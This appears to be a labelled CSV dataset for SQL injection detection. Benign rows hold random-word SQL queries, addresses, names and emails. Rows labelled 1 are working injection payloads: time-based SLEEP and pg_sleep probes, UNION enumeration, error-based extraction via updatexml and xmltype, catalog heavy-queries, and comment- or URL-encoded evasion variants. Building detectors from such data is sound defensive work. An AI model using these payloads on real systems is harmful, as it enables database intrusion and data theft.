Query,Label
SELECT fear ( s )  FROM dead,0
"labiano, s/n 7?a",0
solonitsin3@neotelecom.fi,0
SELECT * FROM stop WHERE to = 'congress' FETCH FIRST 3 ROWS ONLY,0
1/**/oR SLEep (	5		)--nrzf,1
"INSERT INTO onto ( bite, slope, refer, duck, draw, rock )  VALUES  ( 'fight', 'needs'. motion', 'else', 'tribe', 'bark', 'another' )",0
SELECT * FROM protection WHERE    NOT everybody = 'able',0
del cid labastie,0
SELECT * FROM accident  WHERE chair NOT LIKE '[yes]%',0
SELECT * FROM rice WHERE forget = 'shout',0
mieza,0
50296,0
3.57286E+15,0
1%25%27%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,1
"c/ geranio, 65",0
"SELECT * FROM find WHERE barn IN  ( 'put', 'war', 'opinion' )",0
egido s/n,0
select%20case%20when%207634%20%20%3D%20%203954%20then%201%20else%20null%20end--,1
1%27%20%20%29%20%20%20where%204092%20%20%3D%20%204092%20%7C%7C%20char%20%20%28%20%2075%20%20%29%20%20%7C%7Cchar%20%20%28%20%2070%20%20%29%20%20%7C%7Cchar%20%20%28%20%2099%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
SELECT flat ( s )  FROM wash,0
"SELECT Employees.plates, COUNT ( Orders.burstID )  AS patternFROM    ( OrdersINNER JOIN safe ON Orders.youID  =  Employees.callID )",0
eoin,0
SELECT TOP 3 * FROM round,0
SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_term_relationships ON  ( wp_posts.ID  =  wp_term_relationships.object_id )  WHERE 1 = 1 AND  (  wp_term_relationships.term_taxonomy_id IN  ( 2637 )   )  AND wp_posts.post_type  =  'support_family' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC,0
SELECT * FROM held WHERE continued = 'balloon'  AND  ( imagine = 'many' OR furniture = 'badly' ),0
-3846%'/*!or*/6872 	=6872/*!And*/'%'	=',1
es2eri5o,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20AS%20nuku%20WHEre%207009%20%20%3D%20%207009%20uNiOn%20alL%20SElECT%20nULL%2CnULL%2CnULL%2CnULL%2CnULL%23,1
-8639/**//**/)/**//**//**/||/**/8138/**//**/=/**//**/6252,1
"SELECT poet, missing, common FROM reason WHERE doing  IS NULL",0
"SELECT Orders.OrderID, Customers.CustomerName FROM Orders INNER JOIN  Customers ON Orders.CustomerID  =  Customers.CustomerID;",0
SELECT TOP 3 * FROM managed SELECT * FROM upon 3SELECT * FROM down,0
DELETE FROM ring,0
SELECT COUNT ( spring ) FROM citizen,0
4ip7237o8h2dira,0
"SELECT Orders.zerorID, Employees.as, Employees.fireplace FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.solidID ORDER BY Orders.structureID",0
-2140%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%208174%2C8174%2C8174%23,1
parke konstituzio 128 2?b,0
79071325q,0
select%20%20%20%28%20/%2A%21case%2A//%2A%21when%2A/%20%20%28%20%205856/%2A%21LIKE%2A/7176%20%20%29%20%20/%2A%21then%2A/5856/%2A%21else%2A//%2A%21cast%2A/%20%28%20%201/%2A%21as%2A/int%20%20%29%20%20/%20%20%28%20/%2A%21select%2A/0/%2A%21from%2A/dual%20%20%29%20%20/%2A%21end%2A/%20%29%20%20/%2A%21from%2A/dual--,1
( /*!seLECt*/*/*!fROm*/  ( /*!seLECt*/ ( /*!SleEP*/ (  5   )    )     )  lrov  ),1
1%27%2B%20%20%28%20%20select%20wjpc%20where%205943%20%20%3D%20%205943%20%26%26%20make_set%20%20%28%20%208403%20%20%3D%20%208403%2C8899%20%20%20%29%20%20%20%20%29%20%20%20%2B%27,1
SELECT AVG ( favorite ) FROM softly,0
v,1
1'   )    )   /*!&&*/3754  =    ( /*!select*/upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  ( /*!select*/  ( /*!case*//*!when*/  (  3754  =  3754  )  /*!then*/1/*!else*/0/*!end*/ )  /*!from*/dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )  /*!from*/dual  )  /*!&&*/   (    (   'opyp'  =  'opyp,1
verrilli,0
"select	* from users	where	id =1||"",  )  ""=	1 ||	1=1--	1",1
"1""   )    )    aS uqem WhERe 3521 LikE 3521",1
8110,0
1 rlike   (  SeLECt * fROm   (  SeLECt  (  SLeEp  (  5   )    )     )  vwyq  )  #,1
SELECT * FROM space WHERE adult LIKE '%situation%',0
"SELECT instrument,pet FROM usually WHERE think = 'whose' UNION SELECT paper, free FROM larger",0
SELECT allow ( s )  FROM exciting SELECT flew ( s ),0
"1/**//**/)/**//**//**/As/**/wxms/**/Where/**/7272/**//**/=/**//**/7272/**/&&/**/3707/**//**/=/**//**//**//**/(/**//**/sELect/**/count/**//**/(/**//**/*/**//**/)/**//**//**/FrOM/**/sysibm.systables/**/As/**/t1,sysibm.systables/**/As/**/t2,sysibm.systables/**/As/**/t3/**//**/)/**//**/--",1
SELECT * FROM driving WHERE habit NOT BETWEEN 'fully' AND 'chart',0
1   )    )    && 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  ( /*!SeLecT*/  ( /*!CaSe*//*!WhEn*/  (  4386  =  4386  )  /*!Then*/1/*!Else*/0/*!eNd*/ )  /*!fROM*/dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    &&    (    (   1260  =  1260,1
1%25%22%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
-2039'/**//**/)/**//**//**/or/**/2724/**/in/**//**//**//**/(/**//**//**//**/(/**//**//**/char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/112/**//**/)/**//**/+char/**//**/(/**//**/106/**//**/)/**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+/**//**/(/**//**/select/**//**//**/(/**//**/case/**/when/**//**//**/(/**//**/2724/**//**/=/**//**/2724/**//**/)/**//**//**/then/**/char/**//**/(/**//**/49/**//**/)/**//**//**/else/**/char/**//**/(/**//**/48/**//**/)/**//**//**/end/**//**//**/)/**//**//**//**/)/**//**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/122/**//**/)/**//**/+char/**//**/(/**//**/118/**//**/)/**//**/+char/**//**/(/**//**/122/**//**/)/**//**/+char/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/),1
royett pratseva,0
-9875'  )   ||   (  8459  =  8459  )  *4906 &&   (  'mrxw'  =  'mrxw,1
maiga,0
SELECT AVG ( curve )  FROM cat  SELECT SUM ( read ),0
1%22%20%20%29%20%20%20and%208148%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20--,1
SELECT TOP 3 * FROM signal WHERE vast = 'yes',0
yuraj,0
SELECT * FROM bet WHERE NOT mean = 'organization'  AND NOT condition = 'cutting',0
15124,0
"1%' )	 unIOn all sELECT NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl#",1
a9tr8pfag4,0
SELECT COUNT ( forget ) FROM husband,0
1'		) 			)	 as oyadwhere 7161 LIKE 7161	&&6240 LIKE ( 'qqpjq'|| ( select	case6240 when6240then 1else	0	end fromrdb$database	 )  ||'qzvzq' ) 	--,1
SELECT TOP 50 PERCENT * FROM door SELECT * FROM poetry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circle,0
"1'||(	/*!select*/ 'kgfu'	/*!from*/dual/*!where*/2607 =2607/*!and*/	3580	=		(	 /*!select*/	count  (  *)/*!from*/	domain.domains /*!as*/t1,domain.columns/*!as*/	t2,domain.tables /*!as*/t3 )	 --",1
SELECT AVG ( ants ) FROM nothing SELECT SUM ( human ),0
5.35994E+15,0
SELECT * FROM color WHERE rush  BETWEEN 10 AND 20,0
grodecki,0
elois,0
9637,0
1'/**/where/**/5230/**/LIKE/**/5230,1
1%20and%206240%20%20%3D%20%20%20%20%28%20%20%27qqpjq%27%7C%7C%20%20%28%20%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%20%20%29%20%20%7C%7C%27qzvzq%27%20%20%29%20%20--%20izad,1
SELECT COUNT ( height ) FROM studying,0
cea,0
SELECT * FROM getting WHERE tide NOT LIKE '[shop]%',0
"1%'/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/Or/**/updatexml/**//**/(/**//**/1808,concat/**//**/(/**//**/0x2e,0x7171706a71,/**//**/(/**//**/seLECT/**//**//**/(/**//**/elt/**//**/(/**//**/1808/**//**/=/**//**/1808,1/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/,0x717a767a71/**//**/)/**//**/,8666/**//**/)/**//**//**/anD/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/'%'/**//**/=/**//**/'",1
"SELECT * FROM getting WHERE nine IN  ( 'string', 'bone', 'judge' )",0
admin'/**//**/)/**//**//**/or/**//**//**/(/**//**/'1'/**//**/ LIKE /**//**/'1'#,1
SELECT * FROM percent WHERE include = 'race'  OR needs = 'there',0
cherwin4@xavipetit.mu,0
"1/**/ ))		/*!as*/rcon /*!where*/ 8190 	= 8190 /*!or*/5286  =(/*!select*/count	(  *	) 	/*!from*/all_userst1,all_userst2,all_userst3,all_userst4,all_users	t5	)	 --",1
SELECT * FROM then WHERE fell = 'eat',0
"1""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/aNd/**/6055/**//**/=/**//**/ctxsys.drithsx.sn/**//**/(/**//**/6055,/**//**/(/**//**/chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||/**//**/(/**//**/seleCt/**//**//**/(/**//**/cAse/**/When/**//**//**/(/**//**/6055/**//**/=/**//**/6055/**//**/)/**//**//**/THEn/**/1/**/elSe/**/0/**/end/**//**/)/**//**//**/FroM/**/dual/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/aNd/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/""fogb""/**/lIKE/**/""fogb",1
llobet garrido,0
"SELECT Orders.boyrID, Employees.knowledge, Employees.visit FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.signalID ORDER BY Orders.barkID",0
"INSERT INTO younger ( improve, darkness, being, anywhere, rather, lie )  VALUES  ( 'can', 'percent'. cattle', 'necessary', 'position', 'escape', 'check' )",0
SELECT * FROM food WHERE lips NOT BETWEEN 'ordinary' AND 'mix',0
SELECT * FROM sky WHERE bar IN  ( SELECT asleep FROM balloon ),0
select%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20--%20ygbf,1
uriz carmona,0
SELECT AVG ( drink ) FROM century,0
"1""/**//**//**/)/**//**//**//**/)/**//**//**//*!and*/elt/**//**/(/**//**/1210/**//**/=/**//**/1210,/*!sleep*//**/(/**//**/5/**//**//**/)/**//**//**//**/)/**//**//**//*!and*//**//**//**/(/**//**//**//**/(/**//**//**/""afby""/**//**/=/**//**/""afby",1
"-9176'/**/	))		aseunw where5978 = 5978	or1groupbyconcat	(	0x7171706a71, (select			( case when 	(4232  = 4232 )	 then 1else0end 	)	) 	,0x717a767a71,floor( rand(	 0 )		*2	 )  )	having	min (0 )	#",1
c/ alcazalquivir s/n,0
50690,0
SELECT * FROM goes FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM unit WHERE Price NOT BETWEEN 10 AND 20,0
"pl. comercial 54, 5d",0
andrs castanyer,0
1'+	 (select	eluwwhere6210 LIKE	6210,1
byron@vinavilano.gl,0
277,0
d75a4r45der,0
SELECT MIN ( grown )  AS weak FROM battle,0
"1'/**//**/)/**//**//*!as*/dvoy/*!where*/7906/**//**/=/**//**/7906/*!and*//*!char*//**/(/**//**/109/**//**/)/**//**/||/*!char*//**/(/**//**/79/**//**/)/**//**/||/*!char*//**/(/**//**/70/**//**/)/**//**/||/*!char*//**/(/**//**/90/**//**/)/**//**//**//**/=/**//**/regexp_substring/**//**/(/**//**/repeat/**//**/(/**//*!right*//**/(/**//*!char*//**/(/**//**/5012/**//**/)/**//**/,0/**//**/)/**//**/,5000000000/**//**/)/**//**/,/*!null*//**/)/**//**/--",1
lagunaseca,0
SELECT * FROM grew WHERE then NOT LIKE '[machine]%',0
SELECT * FROM sit,0
"-9054""  )  /*!as*/rgyu/*!where*/3792 LIKE 3792/*!order*//*!by*/1--",1
callie,0
SELECT * FROM system WHERE freedom BETWEEN 'animal' AND 'sheet',0
"iif  (  9229 LIKE 4158,1,1/0  )",1
"1""/**/		)	)asljhz	where 2416 LIKE 2416",1
-4322' )	)	  /*!as*/	magw /*!where*/1627/*!LIKE*/1627/*!or*/	4747/*!LIKE*/dbms_utility.sqlid_to_sqlhash		(	 ( 	 chr( 113)	||chr( 	113)	||chr	(112)||chr 	( 	106	) ||chr( 113 	)	||(/*!select*/ (/*!case*//*!when*/ (4747/*!LIKE*/4747	)		 /*!then*/1 /*!else*/0 /*!end*/	)	/*!from*/dual )	||chr(		113  )	 ||chr(122 )	||chr	(118)		||chr	(		122)||chr	(	 113		) )		) --,1
-2701%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20wvht%20where%205401%20%20%3D%20%205401%20union%20all%20select%205401%2C5401%2C5401%2C5401%2C5401%2C5401%2C5401%2C5401%23,1
SELECT AVG ( beginning ) FROM lower SELECT SUM ( exchange ),0
1%27%7C%7C%20%20%28%20%20SELect%20%27wyng%27%20FROM%20dual%20wHere%202157%20%20%3D%20%202157%20UnioN%20alL%20SELect%20NuLL%2CNuLL--,1
7.40029E+15,0
SELECT TOP 50 PERCENT * FROM dirt,0
"1'/**/ )  astaay	where7027= 7027andelt	(	4249	= 4249,7259	 ) --",1
"SELECT REPEAT ( ""SQL Tutorial"", 3 ) ;",0
"-1438/*!where*/6759	 =6759 /*!union*//*!all*//*!select*/ 6759,6759#",1
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20/%2A%21or%2A/4411%20%20%3D%20%20%20%20%28%20/%2A%21select%2A/count%20%20%28%20%20%2A%20%20%29%20%20/%2A%21from%2A/sysusers/%2A%21as%2A/sys1%2Csysusers/%2A%21as%2A/sys2%2Csysusers/%2A%21as%2A/sys3%2Csysusers/%2A%21as%2A/sys4%2Csysusers/%2A%21as%2A/sys5%2Csysusers/%2A%21as%2A/sys6%2Csysusers/%2A%21as%2A/sys7%20%20%29%20%20/%2A%21and%2A/%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
81208495a,0
vinko,0
1/%2A%2A/anD/%2A%2A/6055/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/ctxsys.drithsx.sn/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/6055%2C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/chr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/112/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/106/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/selecT/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/cAse/%2A%2A/wHEN/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/6055/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/6055/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/THEn/%2A%2A/1/%2A%2A/eLse/%2A%2A/0/%2A%2A/ENd/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/from/%2A%2A/dual/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/122/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/118/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/122/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%23/%2A%2A/rhli,1
nogueras,0
"1%""/*!&&*/1343  =  5939#",1
"1		)		where2741	LIKE 2741 and6414	LIKE(selectcount	(*)		from	rdb$fieldsas t1,rdb$typesas t2,rdb$collationsast3,rdb$functionsast4) --",1
1%27%20%20%29%20%20%20and%206969%20%20%3D%20%20%20%20%28%20%20select%206969%20from%20pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29,1
e_ncobador,0
60613075w,0
"1""  )  /*!as*/pkkx/*!where*/6716 LIKE 6716/*!and*/updatexml  (  3393,concat  (  0x2e,0x7171706a71,  ( /*!select*/  (  elt  (  3393 LIKE 3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
maula,0
"-9347'  )  /*!UNioN*//*!alL*//*!SELeCT*/3884,3884#",1
"INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food )  VALUES  ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )",0
"SELECT sand,baseball,rock FROM tears LEFT JOIN Orders ON book.environmentID =  any.got ORDER BY shelf.aloud",0
SELECT MAX ( Price )  AS LargestPrice FROM Products;,0
-7452/*!where*/ 2224=	 2224 /*!or*/ 4747 =	dbms_utility.sqlid_to_sqlhash(	(  chr		( 113)	||chr	( 113 	)	||chr (	112	)	||chr	( 106 	)||chr  ( 	113)	|| ( /*!select*/  (	/*!case*//*!when*/  (4747=	4747) 		/*!then*/1 /*!else*/0/*!end*/) /*!from*/dual	) ||chr	( 113	 ) ||chr	(	122	)||chr	(118)	||chr 	( 122 )||chr( 113	 	)   )	 ) --,1
"-6463""   )    )     )  /*!union*//*!all*//*!select*/3280,3280,3280,3280,3280,3280,3280,3280,3280#",1
"1',  ( /*!select*/  ( /*!case*//*!when*/  (  3902 LIKE 3902  )  /*!then*/  ( /*!select*/count  (  *  )  /*!from*/all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  /*!else*/1/  ( /*!select*/0/*!from*/dual  )  /*!end*/ )  /*!from*/dual  )",1
SELECT * FROM dinner WHERE Price NOT BETWEEN 10 AND 20,0
barriga requena,0
-8248 ||5903 =  ('qqpjq'||	(	select case	5903	when 5903	then1	else 0	end fromrdb$database )	||'qzvzq' ),1
1.65E+15,0
SELECT DISTINCT history FROM history,0
"SELECT * FROM step WHERE knew IN  ( 'suit', 'shine', 'pot' )",0
SELECT DISTINCT hunter FROM bus,0
SELECT COUNT ( beginningID ) FROM were,0
22533,0
-6036%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20/%2A%21or%2A/3440%20%20%3D%20/%2A%21cast%2A/%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%20%20%28%20/%2A%21select%2A/%20%20%28%20/%2A%21case%2A//%2A%21when%2A/%20%20%28%20%203440%20%20%3D%20%203440%20%20%29%20%20/%2A%21then%2A/1/%2A%21else%2A/0/%2A%21end%2A/%20%20%29%20%20%20%20%29%20%20%20%3A%3A/%2A%21text%2A/%7C%7C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20/%2A%21as%2A/numeric%20%20%29%20%20/%2A%21and%2A/%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%206723%20%20%3D%20%206723,1
"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",1
miner@zing.lk,0
"1""/**//**/)/**//**//**/wheRe/**/6478/**//**/=/**//**/6478/**/uNIoN/**/All/**/SEleCT/**/NulL,NulL,NulL,NulL,NulL,NulL#",1
eglevsky-dux@tacticlinks.ch,0
FROM  ( SELECT DISTINCT bark FROM older ),0
werling,0
"1'/*!and*//**//**/(/**//*!select*/9067/*!from*//**/(/**//*!select*/count/**//**/(/**//**/*/**//**/)/**//**/,concat/**//**/(/**//**/0x7171706a71,/**//**/(/**//*!select*//**//**/(/**//**/elt/**//**/(/**//**/9067/**//**/=/**//**/9067,1/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/,0x717a767a71,floor/**//**/(/**//**/rand/**//**/(/**//**/0/**//**/)/**//**/*2/**//**//**/)/**//**//**//**/)/**//**//**/x/*!from*/information_schema.character_sets/*!group*//*!by*/x/**//**/)/**//**/a/**//**/)/**//**//*!and*/'ankn'/**//**/=/**//**/'ankn",1
SELECT * FROM silence 3 SELECT * FROM dozen,0
marcanti,0
SELECT * FROM heading WHERE tie = 'nearer',0
guell lloret,0
1%27/%2A%2A/where/%2A%2A/5023/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/5023/%2A%2A/&&/%2A%2A/3580/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/select/%2A%2A/count/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/%2A/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/from/%2A%2A/domain.domains/%2A%2A/as/%2A%2A/t1%2Cdomain.columns/%2A%2A/as/%2A%2A/t2%2Cdomain.tables/%2A%2A/as/%2A%2A/t3/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/--,1
SELECT * FROM paper WHERE night NOT LIKE 'basic%',0
cunillera penades,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_3146' LIMIT 1,0
68689912k,0
SELECT * FROM foreign,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20gxvp%20where%203865%20%20%3D%20%203865,1
1'	 ))	/*!and*/3754	=		( /*!select*/	upper	(xmltype(chr ( 60)||chr 	( 	58 ) ||chr		(	113	)||chr(113	)	||chr	(	112 ) ||chr ( 106	)	||chr(113 )	||(	/*!select*/	(/*!case*//*!when*/	( 3754	 = 	3754 )	 /*!then*/ 1/*!else*/ 0 /*!end*/ 	)  /*!from*/dual	)  ||chr (113		)||chr	( 122  )	 ||chr (	118		)	||chr ( 	122)||chr	 (	113  )  ||chr (  62	)	 	) 		) 	/*!from*/ dual	)	/*!and*/ 	(		 (  	'ajka'=	'ajka,1
SELECT * FROM careful FETCH FIRST 50 PERCENT ROWS ONLY,0
1/**/union/**/all/**/select/**/null--,1
"1""/**/and/**//**//**/(/**//**/7424/**/LIKE/**/2381/**//**/)/**//**/*2381/**/and/**/""dvju""/**/LIKE/**/""dvju",1
"SELECT column_name ( s )  FROM due,musical",0
2561,0
-7741%27/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/where/%2A%2A/8271/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/8271/%2A%2A/union/%2A%2A/all/%2A%2A/select/%2A%2A/8271%2C8271%2C8271%2C8271%2C8271%2C8271%2C8271%23,1
SELECT stood ( s )  FROM pipe UNION,0
SELECT * FROM may WHERE    NOT find = 'plain',0
-9569%25%27%09%09%C2%A0%29%0B%0B%0B%0B%29%0C%09%0B%0CunION%0BAlL%09selECt%C2%A08405%2C8405%2C8405%2C8405--,1
SELECT AVG ( mistake )  FROM principal  SELECT SUM ( opinion ),0
"SELECT circusID AS ID, suit AS rope FROM mile",0
"1%'/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**//*!or*//**/8421/**//**/=/**//**//**//**/(/**//**//*!select*//**/count/**//**/(/**//**/*/**//**/)/**//**//**//*!from*//**/generate_series/**//**/(/**//**/1,5000000/**//**//**/)/**//**//**//**/)/**//**//**//**//*!and*//**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/'%'/**//**/=/**//**/'",1
sElecT%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20%2B%20%40%3C%40.%20union%20select%201%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201,1
1%25%22/%2A%21and%2A/3707%20%20%3D%20%20%20%20%28%20/%2A%21select%2A/count%20%20%28%20%20%2A%20%20%29%20%20/%2A%21from%2A/sysibm.systables/%2A%21as%2A/t1%2Csysibm.systables/%2A%21as%2A/t2%2Csysibm.systables/%2A%21as%2A/t3%20%20%29%20%20/%2A%21and%2A/%22%25%22%20%20%3D%20%20%22,1
SELECT * FROM exactly,0
"-3347'+  (  select xuzs where 1076 LIKE 1076 union all select 1076,1076,1076,1076,1076--",1
"SELECT lady, crack, discovery FROM grade WHERE captured  IS NULL",0
"arroyo prado del rey 60,",0
SELECT sea ( s FROM consider RIGHT JOIN,0
-6890%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%205771%20%20%3D%20%207721--,1
